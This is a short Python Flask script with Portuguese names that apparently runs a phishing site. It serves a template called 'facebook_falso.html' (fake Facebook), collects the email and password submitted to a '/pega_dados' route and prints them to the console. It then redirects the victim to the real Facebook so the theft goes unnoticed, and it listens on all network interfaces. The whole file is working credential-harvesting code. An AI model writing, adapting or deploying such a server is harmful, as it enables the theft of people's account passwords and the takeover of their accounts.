from flask import *

app = Flask(__name__)

@app.route("/")
def pagina_inicial():
    return render_template("facebook_falso.html")

@app.route("/pega_dados", methods=["POST"])
def pega_dados():
    email = request.form.get("email")
    senha = request.form.get("pass")

    print(f"E-MAIL: {email}\n SENHA: {senha}")
    
    return redirect("https://www.facebook.com/")

if __name__ == '__main__':
    app.run(host="0.0.0.0", port="8080")